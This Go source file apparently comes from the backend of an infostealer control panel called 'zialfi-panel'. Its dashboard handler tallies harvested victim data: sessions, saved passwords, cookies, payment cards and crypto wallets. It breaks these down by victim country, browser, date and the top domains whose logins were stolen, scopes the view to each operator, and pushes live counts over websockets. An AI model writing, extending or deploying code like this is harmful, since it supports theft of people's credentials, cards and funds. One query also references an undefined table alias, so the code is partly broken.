package api

import (
	"database/sql"
	"net/http"

	"zialfi-panel/internal/middleware"
	"zialfi-panel/internal/ws"
)

type StatsHandler struct {
	db  *sql.DB
	hub *ws.Hub
}

type StatsResponse struct {
	Sessions   SessionStats   `json:"sessions"`
	Passwords  CountStats     `json:"passwords"`
	Cookies    CountStats     `json:"cookies"`
	Cards      CountStats     `json:"cards"`
	Wallets    CountStats     `json:"wallets"`
	Geo        []GeoEntry     `json:"geo"`
	Browsers   []BrowserEntry `json:"browsers"`
	Timeline   []TimelineEntry `json:"timeline"`
	TopDomains []DomainEntry  `json:"top_domains"`
}

type SessionStats struct {
	Total int `json:"total"`
	Today int `json:"today"`
}

type CountStats struct {
	Total int `json:"total"`
}

type GeoEntry struct {
	CountryCode string `json:"country_code"`
	Count       int    `json:"count"`
}

type BrowserEntry struct {
	Browser string `json:"browser"`
	Count   int    `json:"count"`
}

type TimelineEntry struct {
	Date  string `json:"date"`
	Count int    `json:"count"`
}

type DomainEntry struct {
	Domain string `json:"domain"`
	Count  int    `json:"count"`
}

func NewStatsHandler(db *sql.DB, hub *ws.Hub) *StatsHandler {
	return &StatsHandler{db: db, hub: hub}
}

func (h *StatsHandler) Dashboard(w http.ResponseWriter, r *http.Request) {
	resp := StatsResponse{
		Sessions:   SessionStats{},
		Passwords:  CountStats{},
		Cookies:    CountStats{},
		Cards:      CountStats{},
		Wallets:    CountStats{},
		Geo:        []GeoEntry{},
		Browsers:   []BrowserEntry{},
		Timeline:   []TimelineEntry{},
		TopDomains: []DomainEntry{},
	}

	ownerClause := ""
	var ownerArgs []any
	if claims := middleware.ClaimsFromContext(r.Context()); claims != nil && claims.Role != "admin" {
		ownerClause = " AND s.owner_id = ?"
		ownerArgs = []any{claims.UserID}
	}

	h.db.QueryRow("SELECT COUNT(*) FROM sessions"+whereOwner("", ownerClause), ownerArgs...).Scan(&resp.Sessions.Total)
	h.db.QueryRow("SELECT COUNT(*) FROM sessions WHERE date(created_at) = date('now')"+ownerClause, ownerArgs...).Scan(&resp.Sessions.Today)

	joinClause := ""
	if ownerClause != "" {
		joinClause = " JOIN sessions s ON s.id = p.session_id" + ownerClause
	}
	h.db.QueryRow("SELECT COUNT(*) FROM passwords p"+joinClause, ownerArgs...).Scan(&resp.Passwords.Total)
	h.db.QueryRow("SELECT COUNT(*) FROM cookies c"+joinClause, ownerArgs...).Scan(&resp.Cookies.Total)
	h.db.QueryRow("SELECT COUNT(*) FROM cards c"+joinClause, ownerArgs...).Scan(&resp.Cards.Total)
	h.db.QueryRow("SELECT COUNT(*) FROM wallets w"+joinClause, ownerArgs...).Scan(&resp.Wallets.Total)

	geoRows, err := h.db.Query("SELECT s.country_code, COUNT(*) as c FROM sessions s WHERE s.country_code != ''"+ownerClause+" GROUP BY s.country_code ORDER BY c DESC LIMIT 20", ownerArgs...)
	if err == nil {
		defer geoRows.Close()
		for geoRows.Next() {
			var e GeoEntry
			if geoRows.Scan(&e.CountryCode, &e.Count) == nil {
				resp.Geo = append(resp.Geo, e)
			}
		}
	}

	browserRows, err := h.db.Query("SELECT p.browser, COUNT(*) as c FROM passwords p"+joinClause+" WHERE p.browser != '' GROUP BY p.browser ORDER BY c DESC", ownerArgs...)
	if err == nil {
		defer browserRows.Close()
		for browserRows.Next() {
			var e BrowserEntry
			if browserRows.Scan(&e.Browser, &e.Count) == nil {
				resp.Browsers = append(resp.Browsers, e)
			}
		}
	}

	timelineRows, err := h.db.Query("SELECT date(s.created_at) as d, COUNT(*) FROM sessions s WHERE s.created_at >= datetime('now', '-30 days')"+ownerClause+" GROUP BY d ORDER BY d", ownerArgs...)
	if err == nil {
		defer timelineRows.Close()
		for timelineRows.Next() {
			var e TimelineEntry
			if timelineRows.Scan(&e.Date, &e.Count) == nil {
				resp.Timeline = append(resp.Timeline, e)
			}
		}
	}

	domainRows, err := h.db.Query(`
		SELECT
			COALESCE(
				CASE
					WHEN p.url LIKE 'https://%' THEN SUBSTR(p.url, 9)
					WHEN p.url LIKE 'http://%' THEN SUBSTR(p.url, 8)
					ELSE p.url
				END,
				p.url
			) as domain,
			COUNT(*) as c
		FROM passwords p`+joinClause+`
		WHERE p.url != ''
		GROUP BY domain
		ORDER BY c DESC
		LIMIT 20
	`, ownerArgs...)
	if err == nil {
		defer domainRows.Close()
		for domainRows.Next() {
			var e DomainEntry
			if domainRows.Scan(&e.Domain, &e.Count) == nil {
				resp.TopDomains = append(resp.TopDomains, e)
			}
		}
	}

	writeJSON(w, http.StatusOK, resp)

	if h.hub != nil {
		event := ws.NewStatsEvent(ws.StatsPayload{
			SessionsTotal:  resp.Sessions.Total,
			SessionsToday:  resp.Sessions.Today,
			PasswordsTotal: resp.Passwords.Total,
		})
		// Dashboard already computes owner-scoped stats; deliver them on the
		// caller's per-user channel. Admins see global stats via their own
		// channel — no separate stats:all needed.
		if uid := claimsUserID(r); uid != "" {
			h.hub.Broadcast("stats:"+uid, event)
		}
	}
}

// whereOwner joins an owner clause onto an existing WHERE-less query.
func whereOwner(base, ownerClause string) string {
	if ownerClause == "" {
		return ""
	}
	if base == "" {
		return " WHERE 1=1" + ownerClause
	}
	return " WHERE " + base + ownerClause
}
